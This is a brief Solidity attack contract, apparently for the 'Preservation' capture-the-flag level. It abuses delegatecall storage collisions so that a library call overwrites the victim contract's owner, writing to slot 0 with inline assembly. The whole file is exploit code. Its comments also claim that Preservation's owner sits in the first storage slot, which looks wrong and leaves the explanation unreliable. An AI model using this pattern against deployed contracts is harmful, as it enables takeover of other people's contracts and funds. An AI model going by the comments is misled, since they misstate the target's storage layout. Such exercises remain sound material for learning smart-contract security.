pragma solidity ^0.8.0;
contract MyAttackLibrary {
    address public owner;

    function setTime(uint256 _time) public {
        // Overwrite Preservation's owner by using delegatecall
        // The first storage slot in MyAttackLibrary (owner) corresponds 
        // to the first storage slot in Preservation (also owner)
        assembly {
            sstore(0, _time)
        }
    }
}